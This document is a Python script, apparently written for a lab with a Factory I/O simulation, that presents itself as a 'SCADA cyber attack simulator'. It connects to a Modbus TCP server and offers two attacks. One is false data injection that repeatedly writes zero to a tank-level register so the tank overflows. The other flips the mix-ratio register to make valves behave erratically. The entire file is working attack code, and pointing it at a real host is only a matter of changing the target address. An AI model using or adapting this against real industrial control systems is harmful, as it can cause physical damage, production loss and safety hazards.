import time
from pymodbus.client import ModbusTcpClient

# Target SCADA Server
TARGET_IP = '127.0.0.1'
TARGET_PORT = 502

def attack_sensor_spoofing(client):
    """
    FDI Attack: Forces Tank 0 level sensor to report 0 continually.
    Result: The PLC logic will never trigger the 'Tank Full' flag.
    The fill valve will remain 100% open, causing a physical overflow.
    """
    print("\n[ATTACK ACTIVATED] False Data Injection on Tank 0 Sensor.")
    print("[INFO] Watch Factory I/O! Tank 0 should overflow shortly.")
    try:
        while True:
            # Overwrite Holding Register 0 (Tank 0 Level) with 0
            client.write_register(address=0, value=0)
            print("[MALICIOUS WRITE] Tank0_Level -> 0")
            time.sleep(0.2) # High frequency injection
    except KeyboardInterrupt:
        print("\n[ATTACK STOPPED] Terminating sensor spoofing.")

def attack_mix_ratio_tampering(client):
    """
    Process Destabilization: Rapidly oscillates the Mix Ratio.
    Result: Valves 1 and 2 will act erratically, destroying production consistency.
    """
    print("\n[ATTACK ACTIVATED] Mix Ratio Tampering.")
    print("[INFO] Watch the distribution valves go crazy.")
    try:
        while True:
            # Force Mix Ratio to 1000 (100% to Tank 1)
            client.write_register(address=3, value=1000)
            print("[MALICIOUS WRITE] Mix_Ratio -> 1000")
            time.sleep(1)
            
            # Force Mix Ratio to 0 (100% to Tank 2)
            client.write_register(address=3, value=0)
            print("[MALICIOUS WRITE] Mix_Ratio -> 0")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[ATTACK STOPPED] Terminating process destabilization.")

def main():
    client = ModbusTcpClient(TARGET_IP, port=TARGET_PORT)
    
    if not client.connect():
        print("[CRITICAL] Could not connect to target SCADA network.")
        return

    print("=========================================")
    print("      SCADA CYBER ATTACK SIMULATOR       ")
    print("=========================================")
    print("1. Sensor Spoofing (Tank 0 Overflow)")
    print("2. Process Destabilization (Tamper Mix_Ratio)")
    print("=========================================")
    
    choice = input("Select Attack Vector (1 or 2): ")
    
    if choice == '1':
        attack_sensor_spoofing(client)
    elif choice == '2':
        attack_mix_ratio_tampering(client)
    else:
        print("[ERROR] Invalid selection.")

    client.close()

if __name__ == "__main__":
    main()